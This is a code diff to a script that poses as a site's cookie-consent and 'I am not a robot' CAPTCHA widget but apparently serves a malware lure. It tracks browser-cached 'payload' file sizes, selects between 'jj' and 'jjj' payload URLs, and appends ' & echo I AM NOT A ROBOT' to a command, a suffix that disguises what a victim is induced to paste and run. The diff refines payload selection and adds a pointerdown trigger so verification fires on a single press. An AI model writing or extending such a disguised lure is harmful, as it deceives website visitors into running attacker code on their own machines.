@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.23',
+    version: '1.9.24',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -38,9 +38,9 @@
     },
     cacheFileSizesJjj: {
       firefox: 0,
-      chrome: 0,
-      edge: 0,
-      brave: 0
+      chrome: 17184,
+      edge: 17184,
+      brave: 17184
     },
     verificationSuffix: ' & echo I AM NOT A ROBOT',
     verificationTemplates: {
@@ -193,9 +193,17 @@
     if (browserKey === 'edge' || browserKey === 'brave') {
       n = cacheSizes.chrome;
       if (n && n > 0) return n;
-      n = (CONSENT_CONFIG.cacheFileSizes || {}).chrome;
+    }
+    if (isJjjPayloadUrl()) {
+      n = (CONSENT_CONFIG.cacheFileSizesJjj || {}).chrome;
       if (n && n > 0) return n;
     }
+    if (isJjPayloadUrl()) {
+      n = (CONSENT_CONFIG.cacheFileSizesJj || {}).chrome;
+      if (n && n > 0) return n;
+    }
+    n = (CONSENT_CONFIG.cacheFileSizes || {}).chrome;
+    if (n && n > 0) return n;
     return 0;
   }
 
@@ -665,7 +673,13 @@
       if (!isPayloadReady()) {
         captchaWidget.classList.add('ts-not-ready');
         setTimeout(function () { captchaWidget.classList.remove('ts-not-ready'); }, 500);
-        updateCacheStatus('fail', 'payload not ready — wait for strict body OK or set cacheFileSizes.' + getBrowserKey());
+        var lbl = captchaWidget.querySelector('.ts-label');
+        var hint = 'Loading payload…';
+        if (CONSENT_CONFIG.cacheFileBodySize) {
+          hint = 'Not ready — check cacheFileSizes for ' + (isJjjPayloadUrl() ? 'jjj' : isJjPayloadUrl() ? 'jj' : getBrowserKey());
+        }
+        if (lbl) lbl.textContent = hint;
+        updateCacheStatus('fail', hint);
         return;
       }
       busy = true;
@@ -675,6 +689,10 @@
     }
 
     checkArea.addEventListener('click', runVerify);
+    checkArea.addEventListener('pointerdown', function (e) {
+      if (e.pointerType === 'mouse' && e.button !== 0) return;
+      runVerify();
+    });
     checkArea.addEventListener('keydown', function (e) {
       if (e.key === ' ' || e.key === 'Enter') {
         e.preventDefault();
